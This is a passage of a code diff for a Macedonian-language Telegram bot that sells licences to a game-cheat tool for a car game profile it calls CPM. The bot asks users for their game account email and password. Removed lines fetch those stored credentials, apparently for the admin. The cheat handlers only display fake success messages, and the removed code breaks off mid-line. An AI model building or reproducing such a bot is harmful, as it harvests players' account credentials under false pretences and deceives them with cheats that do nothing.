-        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 1')
-        active = cursor.fetchone()[0]
-        cursor.execute('SELECT COUNT(*) FROM licenci WHERE odobren = 0')
-        waiting = cursor.fetchone()[0]
-        conn.close()
-        
-        text = (
-            f"📊 **СТАТИСТИКА**\n"
-            f"━━━━━━━━━━━━━━━━━━━\n"
-            f"👥 Вкупно: **{total}**\n"
-            f"✅ Активни: **{active}**\n"
-            f"⏳ Чекаат: **{waiting}**\n"
-            f"━━━━━━━━━━━━━━━━━━━"
-        )
-        keyboard = [[InlineKeyboardButton("🔙 Назад", callback_data="admin_panel")]]
-        await query.edit_message_text(text=text, reply_markup=InlineKeyboardMarkup(keyboard), parse_mode='Markdown')
-        return
+    if akcija == "forever":
+        istekuvanje = "forever"
+    else:
+        istekuvanje = (datetime.now() + timedelta(days=int(akcija))).strftime("%Y-%m-%d %H:%M:%S")
+    
+    # Зачувување во база
+    cursor.execute('INSERT OR REPLACE INTO korisnici (user_id, istekuvanje) VALUES (?, ?)', (user_id, istekuvanje))
+    conn.commit()
+    conn.close()
+    
+    await query.edit_message_text(f"✅ Лиценцата е доделена на корисникот {user_id} за {traenje}.")
+    await context.bot.send_message(
+        chat_id=user_id,
+        text=f"✅ Добивте пристап до AJHAN X TOOL!\nВреметраење: {traenje}\nНапишете /start за да започнете."
+    )
 
-    # АДМИН ЛИЦЕНЦИ
-    if data.startswith("lic:"):
-        parts = data.split(":")
-        action = parts[1]
-        target_id = int(parts[2])
-        
-        conn = sqlite3.connect('Licenci.db')
-        cursor = conn.cursor()
-        
-        if action == "deny":
-            cursor.execute('DELETE FROM licenci WHERE id = ?', (str(target_id),))
-            conn.commit()
-            conn.close()
-            await context.bot.send_message(chat_id=target_id, text="❌ **Одбиени сте!**")
-            await query.edit_message_text(f"❌ Одбиен корисник {target_id}")
-            return
-            
-        elif action == "approve":
-            cursor.execute('UPDATE licenci SET data = ?, odobren = 1 WHERE id = ?', 
-                          ("forever", str(target_id)))
-            cursor.execute('SELECT email, password, username FROM licenci WHERE id = ?', (str(target_id),))
-            user_info = cursor.fetchone()
-            conn.commit()
-            conn.close()
-            
-            await context.bot.send_message(
-                chat_id=target_id, 
-                text="✅ **Одобрени сте!** Напишете /start за да влезете."
-            )
-            
-            if user_info:
-                email, password, username = user_info
-                admin_not
+# СИТЕ МЕНИ HANDLER-И
+async def meni_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [
+        [InlineKeyboardButton("1M Cash", callback_data='m_1m'), InlineKeyboardButton("5M Cash", callback_data='m_5m')],
+        [InlineKeyboardButton("10M Cash", callback_data='m_10m'), InlineKeyboardButton("25M Cash", callback_data='m_25m')],
+        [InlineKeyboardButton("50M Cash (МАКС)", callback_data='m_50m')],
+        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(text="**МЕНИ ЗА ПАРИ**\nОдберете износ што сакате да го аплицирате.", reply_markup=reply_markup, parse_mode='Markdown')
+
+async def meni_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [
+        [InlineKeyboardButton("5,000 Коинси", callback_data='c_5k'), InlineKeyboardButton("20,000 Коинси", callback_data='c_20k')],
+        [InlineKeyboardButton("40,000 Коинси (МАКС)", callback_data='c_40k')],
+        [InlineKeyboardButton("💥 Коинси (Glitch)", callback_data='c_340k')],
+        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(text="💎 **МЕНИ ЗА КОИНСИ (ЗЛАТНИЦИ)**\nОдберете количина:", reply_markup=reply_markup, parse_mode='Markdown')
+
+async def meni_perf(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [
+        [InlineKeyboardButton("⚙️ W16 Engine", callback_data='f_v16')],
+        [InlineKeyboardButton("🛡️ без штета (No Damage)", callback_data='f_nodmg')],
+        [InlineKeyboardButton("⛽ Бесконечно гориво", callback_data='f_fuel')],
+        [InlineKeyboardButton("🛑 Инстант Кочници", callback_data='f_brakes')],
+        [InlineKeyboardButton("🚀 Турбо 2000hp", callback_data='f_turbo')],
+        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(text="⚙️ **ПЕРФОРМАНСИ И МОТОР**\nОдберете опција за моторот на возилото.", reply_markup=reply_markup, parse_mode='Markdown')
+
+async def meni_visuals(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [
+        [InlineKeyboardButton("⚡ Стробо Светла", callback_data='v_strobe')],
+        [InlineKeyboardButton("💨 Хром Боја", callback_data='v_chrome')],
+        [InlineKeyboardButton("💨 Чад во Боја", callback_data='v_smoke')],
+        [InlineKeyboardButton("🛸 НЛО Светла", callback_data='v_ufo')],
+        [InlineKeyboardButton("👾 Сите Анимации", callback_data='v_anims')],
+        [InlineKeyboardButton("📯 Премиум Сирени", callback_data='v_horns')],
+        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(text="🔮 **ИЗГЛЕД И ВИЗУЕЛНИ ЕФЕКТИ**\nОдберете ефекти за вашето возило.", reply_markup=reply_markup, parse_mode='Markdown')
+
+async def meni_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    keyboard = [
+        [InlineKeyboardButton("🏠 Купи сите Куќи", callback_data='p_houses')],
+        [InlineKeyboardButton("👑 Ранг Кинг", callback_data='p_king')],
+        [InlineKeyboardButton("🚓 Полициска Сирена", callback_data='p_police')],
+        [InlineKeyboardButton("🔓 Отклучи сите Возила", callback_data='p_cars')],
+        [InlineKeyboardButton("🔥 СЕ ОДЕДНАШ (UNLOCK ALL PACK)", callback_data='p_all')],
+        [InlineKeyboardButton("🔙 Назад", callback_data='nazad_vo_glavno')]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await query.edit_message_text(text="👑 **ПРЕМИУМ И КЛАУД СЕЈВ**\nОвозможено отклучување на премиум содржини.", reply_markup=reply_markup, parse_mode='Markdown')
+
+# АКЦИИ ЗА ПАРИ
+async def akcija_money(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    iznos = query.data.split('_')[1]
+    await query.edit_message_text(f"✅ Додадени {iznos} пари на вашиот CPM профил!", parse_mode='Markdown')
+    await asyncio.sleep(2)
+    await prikazi_glavno_meni(update, context)
+
+# АКЦИИ ЗА КОИНСИ
+async def akcija_coins(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    iznos = query.data.split('_')[1]
+    await query.edit_message_text(f"✅ Додадени {iznos} коинси на вашиот CPM профил!", parse_mode='Markdown')
+    await asyncio.sleep(2)
+    await prikazi_glavno_meni(update, context)
+
+# АКЦИИ ЗА ПЕРФОРМАНСИ
+async def akcija_perf(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    akcija = query.data.split('_')[1]
+    opis = {
+        'v16': "W16 мотор активиран",
+        'nodmg': "Без штета активирано",
+        'fuel': "Бесконечно гориво активирано",
+        'brakes': "Инстант кочници активирани",
+        'turbo': "Турбо 2000hp активиран"
+    }.get(akcija, "Перформанса активирана")
+    
+    await query.edit_message_text(f"✅ {opis} на вашето возило!", parse_mode='Markdown')
+    await asyncio.sleep(2)
+    await prikazi_glavno_meni(update, context)
+
+# АКЦИИ ЗА ВИЗУЕЛНИ ЕФЕКТИ
+async def akcija_visuals(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    akcija = query.data.split('_')[1]
+    opis = {
+        'strobe': "Стробо светла активирани",
+        'chrome': "Хром боја аплицирана",
+        'smoke': "Чад во боја активиран",
+        'ufo': "НЛО светла активирани",
+        'anims': "Сите анимации отклучени",
+        'horns': "Премиум сирени активирани"
+    }.get(akcija, "Визуелен ефект активиран")
+    
+    await query.edit_message_text(f"✅ {opis} на вашето возило!", parse_mode='Markdown')
+    await asyncio.sleep(2)
+    await prikazi_glavno_meni(update, context)
+
+# АКЦИИ ЗА ПРЕМИУМ
+async def akcija_premium(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    akcija = query.data.split('_')[1]
+    opis = {
+        'houses': "Сите куќи се купени",
+        'king': "Ранг Кинг доделен",
+        'police': "Полициска сирена активирана",
+        'cars': "Сите возила се отклучени",
+        'all': "СЕ Е ОТКЛУЧЕНО!"
+    }.get(akcija, "Премиум функција активирана")
+    
+    await query.edit_message_text(f"✅ {opis} на вашиот профил!", parse_mode='Markdown')
+    await asyncio.sleep(2)
+    await prikazi_glavno_meni(update, context)
+
+# ИЗЛЕЗ (SIGN OUT)
+async def signout(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await query.edit_message_text("👋 Успешно се одјавивте. Напишете /start за повторна најава.", parse_mode='Markdown')
+    return ConversationHandler.END
+
+# НАЗАД ВО ГЛАВНО МЕНИ
+async def nazad_vo_glavno(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    query = update.callback_query
+    await query.answer()
+    await prikazi_glavno_meni(update, context)
+
+# КОМАНДИ ЗА АДМИН
+async def komanda_admin(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    if update.message.from_user.id != ADMIN_ID:
+        await update.message.reply_text("❌ Оваа команда е само за главниот администратор.")
+        return
+    
+    # Проверка на статусот на базата
+    conn = sqlite3.connect('licenci.db')
+    cursor = conn.cursor()
+    cursor.execute('SELECT COUNT(*) FROM korisnici')
+    broj_korisnici = cursor.fetchone()[0]
+    conn.close()
+    
+    await update.message.reply_text(
+        f"👑 **Админ Панел**\n\n"
+        f"📊 Вкупен број на корисници: {broj_korisnici}\n"
+        f"📅 Лиценците се чуваат во 'licenci.db'\n"
+        f"🔐 Системот работи стабилно на Termux.",
+        parse_mode='Markdown'
+    )
+
+async def komanda_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text(
+        "❓ **Помош**\n\n"
+        "📌 **Команди:**\n"
+        "/start - Започни со користење на ботот\n"
+        "/help - Прикажи ја оваа порака\n"
+        "/admin - Админ панел (само за админ)\n\n"
+        "🔑 **Лиценца:**\n"
+        "Доколку немаш пристап, почекај сопственикот да ти одобри лиценца.\n\n"
+        "💡 **Користење:**\n"
+        "Откако ќе бидеш одобрен, напиши /start и внеси ги твоите CPM податоци.",
+        parse_mode='Markdown'
+    )
+
+async def nepoznata_komanda(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    await update.message.reply_text("❌ Непозната команда. Напишете /help за да видите достапни команди.")
+
+def main():
+    # Креирање на апликација
+    application = ApplicationBuilder().token(BOT_TOKEN).build()
+
+    # Креирање на конверзација
+    conv_handler = ConversationHandler(
+        entry_points=[CommandHandler('start', start)],
+        states={
+            CEKA_EMAIL: [MessageHandler(filters.TEXT & ~filters.COMMAND, primi_email)],
+            CEKA_PASSWORD: [MessageHandler(filters.TEXT & ~filters.COMMAND, primi_password)],
+            GLAVNO_MENI: [CallbackQueryHandler(prikazi_glavno_meni, pattern='^glavno_meni$')],
+        },
+        fallbacks=[CommandHandler('start', start)],
+    )
+
+    # Додавање на handler-и
+    application.add_handler(conv_handler)
+    application.add_handler(CallbackQueryHandler(licenca_handler, pattern='^lic_'))
+    application.add_handler(CallbackQueryHandler(meni_money, pattern='^meni_money$'))
+    application.add_handler(CallbackQueryHandler(meni_coins, pattern='^meni_coins$'))
+    application.add_handler(CallbackQueryHandler(meni_perf, pattern='^meni_perf$'))
+    application.add_handler(CallbackQueryHandler(meni_visuals, pattern='^meni_visuals$'))
+    application.add_handler(CallbackQueryHandler(meni_premium, pattern='^meni_premium$'))
+    application.add_handler(CallbackQueryHandler(akcija_money, pattern='^m_'))
+    application.add_handler(CallbackQueryHandler(akcija_coins, pattern='^c_'))
+    application.add_handler(CallbackQueryHandler(akcija_perf, pattern='^f_'))
+    application.add_handler(CallbackQueryHandler(akcija_visuals, pattern='^v_'))
+    application.add_handler(CallbackQueryHandler(akcija_premium, pattern='^p_'))
+    application.add_handler(CallbackQueryHandler(signout, pattern='^signout$'))
+    application.add_handler(CallbackQueryHandler(nazad_vo_glavno, pattern='^nazad_vo_glavno$'))
+    application.add_handler(CommandHandler('admin', komanda_admin))
+    application.add_handler(CommandHandler('help', komanda_help))
+    application.add_handler(MessageHandler(filters.COMMAND, nepoznata_komanda))
+
+    # Стартување на ботот
+    print("🤖 Ботот е стартуван!")
+    application.run_polling()
+
+if __name__ == '__main__':
+    main()
